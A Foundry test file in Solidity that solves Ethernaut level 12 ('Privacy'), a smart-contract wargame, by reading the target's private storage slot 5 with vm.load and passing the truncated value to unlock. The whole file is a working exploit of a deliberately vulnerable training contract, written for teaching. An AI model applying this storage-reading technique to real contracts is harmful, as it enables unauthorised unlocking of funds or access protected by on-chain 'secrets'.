pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IPrivacy {
    function unlock(bytes16 _key) external;
}

contract Ethernaut12 is EthernautTest {
    constructor() EthernautTest(12) {}

    function solve() internal override(EthernautTest) {
        bytes32 data = vm.load(instance, bytes32(uint256(5)));

        bytes16 password = bytes16(data);

        IPrivacy(instance).unlock(password);
    }
}
